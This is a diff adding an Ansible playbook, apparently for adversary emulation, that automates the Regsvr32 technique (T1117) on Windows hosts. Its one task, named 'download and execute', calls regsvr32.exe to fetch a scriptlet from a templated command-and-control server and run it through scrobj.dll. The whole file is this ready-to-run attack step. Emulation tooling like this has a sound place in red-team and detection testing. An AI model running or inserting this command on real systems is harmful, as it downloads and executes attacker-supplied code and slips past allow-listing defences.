@@ -1,0 +1,9 @@
+#T1117 - Regsvr32
+- name: Regsvr32 - Windows
+  hosts: windows
+  vars_files:
+   - /opt/ansible/vars.yaml
+  tasks:
+    - name: download and execute
+      win_command: |
+        regsvr32.exe /s /u /i:http://{{ cnc_fqdn }}:{{ cnc_port}}/{{ cnc_sct }} scrobj.dll
